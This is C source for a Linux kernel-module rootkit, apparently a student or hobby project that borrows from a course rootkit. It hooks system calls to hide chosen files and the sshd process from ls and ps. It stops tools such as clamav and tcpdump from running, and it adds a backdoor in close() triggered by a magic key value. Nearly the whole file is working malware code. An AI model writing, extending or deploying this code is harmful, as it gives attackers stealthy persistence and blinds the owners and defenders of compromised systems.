#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/slab.h>
#include <linux/err.h>
#include <linux/types.h>
#include <linux/unistd.h>
#include <asm/uaccess.h>
#include <linux/namei.h>
#include <linux/fs.h>
#include <linux/utsname.h>
#include <linux/file.h>
#include <linux/fdtable.h>
#include <linux/proc_ns.h>
#include <linux/sched.h>

//prototype our device functions

static int dev_open(struct inode *, struct file *);
static int dev_rls(struct inode *, struct file *);
static ssize_t dev_read(struct file *, char *, size_t, loff_t *);
static ssize_t dev_write(struct file *, const char *, size_t, loff_t *);


static struct file_operations fops = 
{
	.read = dev_read,
	.open = dev_open,
	.write = dev_write,
	.release = dev_rls,
};


struct linux_dirent {
    unsigned long   d_ino;
    unsigned long   d_off;
    unsigned short  d_reclen;
    char            d_name[1];
};

//Instead of creating a user as a backdoor, we'll be putting a backdoor in the close system call
//This allows any code running anywhere on the machine to communicate with our rootkit
//Having 1 less user also means leaving less of a trace
//The backdoor is used primarily for hiding and unhiding files 
//but can be expanded in the future.

int agentpid = NULL;

//Really need to eventually move this shit to a config file

int agentKey = 66432;

const char * const BANNED_PROCESSES[] = {"ping", "clamav", "tcpdump"};

const char * const FILES_TO_HIDE[] = {"hidethis"};

const char * const HIDDEN_PROCESSES[] = {"sshd"};

int is_hidden_process(char *proc_name)
{
    int i;
    for (i = 0; i < sizeof(HIDDEN_PROCESSES) / sizeof(char *); i++)
    {
        // Hidden process is found
        if (strcmp(proc_name, HIDDEN_PROCESSES[i]) == 0)
        {
            return 1;
        }
    }
    return 0;
}


//Is the string in a given list of strings?
bool isHidden(const char *input){
	char *kern_buff = NULL;
        int i;
        int ret = NULL;
        kern_buff = kzalloc(strlen_user(input)+1, GFP_KERNEL);
        copy_from_user(kern_buff, input, strlen_user(input));


        for(i = 0; i < sizeof(FILES_TO_HIDE)/sizeof(char *); i++){

        if(strcmp(kern_buff, FILES_TO_HIDE[i]) == 0){
        //printk("%s matches %s", input, FILES_TO_HIDE[i]);
        ret = true;
        return ret;
        } 

        }

        ret = false;
        return ret;

}

long hide_processes(struct linux_dirent *dirp, long getdents_ret)
{
    unsigned int dent_offset;
    struct linux_dirent *cur_dirent, *next_dirent;
    char *proc_name, *dir_name;
    char *dirent_ptr = (char *)dirp;
    int error;
    size_t dir_name_len;
    pid_t pid_num;
    struct task_struct *proc_task;
    struct pid *pid;

    // getdents_ret is number of bytes read
    for (dent_offset = 0; dent_offset < getdents_ret;)
    {
        cur_dirent = (struct linux_dirent *)(dirent_ptr + dent_offset);
        dir_name = cur_dirent->d_name;
        dir_name_len = cur_dirent->d_reclen - 2 - offsetof(struct linux_dirent, d_name);
        error = kstrtoint_from_user(dir_name, dir_name_len, 10, (int *)&pid_num);
        if (error < 0)
        {
            goto next_getdent;
        }
        pid = find_get_pid(pid_num);
        if (!pid)
        {
            goto next_getdent;
        }
        proc_task = get_pid_task(pid, PIDTYPE_PID);
        if (!proc_task)
        {
            goto next_getdent;
        }
        proc_name = (char *)kmalloc((sizeof(proc_task->comm)), GFP_KERNEL);
        if (!proc_name)
        {
            goto next_getdent;
        }
        proc_name = get_task_comm(proc_name, proc_task);
        if (is_hidden_process(proc_name)) {
            // Hide the process by deleting its dirent: shift all its right dirents to left.
            // printk("Hide process: %s\n", proc_task->comm);
            next_dirent = (struct linux_dirent *)((char *)cur_dirent + cur_dirent->d_reclen);
            memcpy(cur_dirent, next_dirent, getdents_ret - dent_offset - cur_dirent->d_reclen);
            getdents_ret -= cur_dirent->d_reclen;
            // To cancel dent_offset += cur_dirent->d_reclen at the end of for loop.
            dent_offset -= cur_dirent->d_reclen;
        }
        kfree(proc_name);
    next_getdent:
        dent_offset += cur_dirent->d_reclen;
    }
    return getdents_ret;
}



//COPYPASTA
int is_command_ps(unsigned int fd)
{
    struct file *fd_file;
    struct inode *fd_inode;

    fd_file = fcheck(fd);
    if (unlikely(!fd_file)) {
        return 0;
    }
    fd_inode = file_inode(fd_file);
    if (fd_inode->i_ino == PROC_ROOT_INO && imajor(fd_inode) == 0 
        && iminor(fd_inode) == 0)
    {
        // DEBUG("User typed command ps");
        return 1;
    }
    return 0;
}


//I literally copied and pasted this portion from CSE509-Rootkit
long handle_ps(unsigned int fd, struct linux_dirent *dirp, long getdents_ret)
{
    struct files_struct *open_files = current->files;
    int is_ps = 0;
    spin_lock(&open_files->file_lock);
    is_ps = is_command_ps(fd);
    if (is_ps != 0) {
        getdents_ret = hide_processes(dirp, getdents_ret);
    }
    spin_unlock(&open_files->file_lock);
    return getdents_ret;
}



// See comment from above, changed about 3 lines
long handle_ls(struct linux_dirent *dirp, long length)
{
    
    unsigned int offset = 0;
    struct linux_dirent *cur_dirent;
    int i;
    struct dirent *new_dirp = NULL;
    int new_length = 0;
    bool isHiddenB = false;

    //struct dirent *moving_dirp = NULL;

    //DEBUG("Entering LS filter");
    // Create a new output buffer for the return of getdents
    new_dirp = (struct dirent *) kmalloc(length, GFP_KERNEL);
    if(!new_dirp)
    {
        //DEBUG("RAN OUT OF MEMORY in LS Filter");
        goto error;
    }

    // length is the length of memory (in bytes) pointed to by dirp
    while (offset < length)
    {
        char *dirent_ptr = (char *)(dirp);
        dirent_ptr += offset;
        cur_dirent = (struct linux_dirent *)dirent_ptr;

        isHiddenB = false; 

	isHiddenB = isHidden(cur_dirent->d_name);
        
        if (!isHiddenB)
        {
            memcpy((void *) new_dirp+new_length, cur_dirent, cur_dirent->d_reclen);
            new_length += cur_dirent->d_reclen;
        }
        offset += cur_dirent->d_reclen;
    }
    //DEBUG("Exiting LS filter");

    memcpy(dirp, new_dirp, new_length);
    length = new_length;

cleanup:
    if(new_dirp)
        kfree(new_dirp);
    return length;
error:
    goto cleanup;
}



asmlinkage long (*orig_execve)(const char __user *filename, char const __user *argv[], char const __user *envp[]);

asmlinkage long (*orig_link)(const char __user *existingpath, const char __user *newpath); 

asmlinkage long (*orig_lstat)(const char __user *pathname, struct stat __user *buf);

asmlinkage long (*orig_fstat)(unsigned int fd, struct __old_kernel_stat __user *statbuf);

asmlinkage long (*orig_stat)(const char __user *pathname, const struct stat __user *buf);

asmlinkage long (*orig_access)(const char __user *pathname, const int __user mode);

asmlinkage long (*orig_close)(unsigned int fd);

//Why not use readdir? 
//strace tells us getdents is the function ls eventually triggers ;)
asmlinkage long (*orig_getdents)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);

//This hacked getdents and accompanying functions are taken almost completely from CSE509-Rootkit.
//Special thank you to the authors for saving me a bunch of time! :)
asmlinkage long hacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
    long getdents_ret;
    // Call original getdents system call.
    getdents_ret = (*orig_getdents)(fd, dirp, count);

    // Entry point into hiding files function
    getdents_ret = handle_ls(dirp, getdents_ret);

    // Entry point into hiding processes function
    getdents_ret = handle_ps(fd, dirp, getdents_ret);

    return getdents_ret;
}


asmlinkage long hacked_close(unsigned int fd){
	int ret = NULL;
	if(fd == agentKey){
		agentpid = task_pid_nr(current);
		//printk("Agent trigger detected\n");
		//printk("Agent process pid is %d\n", agentpid);
	}
	ret = (*orig_close)(fd);
	return ret;
}

			       


asmlinkage int hacked_access(const char __user *pathname, const int __user mode){
	int ret = NULL;
	if(isHidden(pathname)){
		//printk("Tried to access hidden file %s", pathname);
		ret = -ENOENT;
		return ret;
	}
	return (*orig_access)(pathname, mode);
}


//Hook link to hide our files
asmlinkage int hacked_link(const char __user *existingpath, const char __user *newpath){

	int ret = NULL;

	if(isHidden(existingpath)){
	ret = -ENOENT;
	//printk("%s in hidden files", existingpath);
	return ret;	
	}

	ret = (*orig_link)(existingpath, newpath);	
	return ret;


}

//Define our hacked lstat
asmlinkage int hacked_lstat(const char __user *pathname, struct stat __user *buf){
	char *kern_buff = NULL;
	int i;
	int ret = NULL;

	kern_buff = kzalloc(strlen_user(pathname)+1, GFP_KERNEL);
	copy_from_user(kern_buff, pathname, strlen_user(pathname));

	for(i = 0; i < sizeof(FILES_TO_HIDE)/sizeof(char *); i++){
	if(strcmp(kern_buff, FILES_TO_HIDE[i]) == 0){
		ret = -ENOENT;
		return ret;
	}
	}

	ret = (*orig_lstat)(pathname, buf);	
	return ret;

}

//This is my stupid execve example. If a banned process is run, it says file not found.
//It would be dumb as hell to use this in real life. A pretty big giveaway that you're present.
asmlinkage long hacked_execve(const char __user *filename, char const __user *argv[], char const __user *envp[]){

        char *kern_buff = NULL;
        int i;
        int ret = NULL;
        kern_buff = kzalloc(strlen_user(argv[0])+1, GFP_KERNEL);
        copy_from_user(kern_buff, argv[0], strlen_user(argv[0]));
		
	//printk("FILENAME: %s\n", kern_buff);
        for(i = 0; i < sizeof(BANNED_PROCESSES)/sizeof(char *); i++){

        if(strcmp(kern_buff, BANNED_PROCESSES[i]) == 0){
        //printk("Banned process was executed.\n");
        ret = -ENOENT;
        return ret;
        } 

        }

        ret = (*orig_execve)(filename, argv, envp);
        return ret;
}

